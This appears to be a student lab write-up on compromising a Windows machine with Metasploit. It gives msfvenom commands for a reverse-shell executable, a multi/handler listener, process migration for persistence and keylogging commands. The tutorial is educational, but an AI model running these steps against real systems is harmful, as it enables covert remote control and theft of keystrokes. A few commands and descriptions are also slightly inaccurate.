# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:

![etex61](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/9a417db4-820f-4e14-b6d3-4c4bbd2e6763)



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

![etex62](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/90412bef-8c82-45f5-89af-eb541a32fa99)




copy the fun.exe into the apache /var/www/html folder


![etex63](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/ed8c36a0-a938-4b96-bfda-1ce5bcbfd518)

Start apache server
sudo systemctl apache2 start


![etex64](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/585d295a-41f6-45cb-9b61-78e2085d2d11)



Check the status of apache2




Invoke msfconsole:
## OUTPUT:


![etex65](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/07019239-4b85-4deb-bf97-6e1874f59a68)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![etex66](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/31033b54-d478-45b2-9582-689c0713f0d0)



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![etex67](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/50eea79e-9d29-426c-928c-8e60e2dae12c)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![etex67](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/479f7668-6867-4496-874c-1a332988f007)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 


![etex68](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/37966bc6-fb7d-4b5b-b9b0-5ce0ef3c9852)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![etex69](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/4d94ddb3-acaa-4d5e-bd39-298d5108b4ed)



keyscan_dump	Shows the keystrokes captured so far

![etex610](https://github.com/MDINESH220305/Compromising-windows-using-Metasploit/assets/162429215/f3d45e09-2ff9-4f8f-b639-e4d63f97f71b)



## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
